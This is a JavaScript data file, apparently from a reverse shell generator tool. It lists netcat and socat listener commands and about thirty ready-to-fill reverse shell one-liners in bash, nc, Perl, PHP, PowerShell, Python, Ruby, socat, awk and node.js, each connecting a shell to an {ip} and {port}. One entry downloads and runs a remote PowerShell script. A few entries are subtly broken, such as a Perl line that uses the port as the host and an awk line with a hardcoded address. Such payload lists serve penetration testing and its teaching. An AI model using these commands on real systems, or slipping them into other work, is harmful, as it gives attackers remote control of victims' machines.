const rsgData = {

    listenerCommands: [
        ['nc', 'nc -lvnp {port}'],
        ['rlwrap + nc', 'rlwrap nc -lvnp {port}'],
        ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
        ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
	['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}']
    ],

    shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
    
    reverseShellsCommands: [
        ['Bash -i', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
        ['Bash 196', '0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'],
        ['Bash udp', '{shell} -i >& /dev/udp/{ip}/{port} 0>&1'],
        ['nc mkfifo', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/{shell} -i 2>&1|nc {ip} {port} >/tmp/f'],
        ['nc -e', 'nc -e /bin/{shell} {ip} {port}'],
        ['nc -c', 'nc -c {shell} {ip} {port}'],
        ['ncat -e', 'ncat {ip} {port} -e /bin/{shell} '],
        ['ncat udp', 'ncat {ip} {port} -e /bin/{shell}'],
        ['Perl', 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/{shell} -i");};\''],
        ['Perl no sh', 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{port}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''],
        ['PHP exec', 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP shell_exec', 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP system', 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/{shell} -i <&3 >&3 2>&3");\''],
        ['PHP passthru', 'php -r \'$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");\''],
        ['PHP `', 'php -r \'$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;\''],
        ['PHP popen', 'php -r \'$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");\''],
        ['Windows ConPty', 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}'],
        ['PowerShell #1', 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'],
        ['PowerShell #2', 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'],
        ['PowerShell #3 (Base64)', undefined],
        ['Python #1', 'export RHOST="{ip}";export RPORT={port};python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/{shell}")\''],
        ['Python #2', 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/{shell}")\''],
        ['Ruby #1', 'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/{shell} -i <&%d >&%d 2>&%d",f,f,f)\''],
        ['Ruby no sh', 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''],
        ['socat #1', 'socat TCP:{ip}:{port} EXEC:{shell}'],
        ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
        ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
        ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')'],
	['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}']
    ],

    specialCommands: {
        'PowerShell payload': '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    }
}
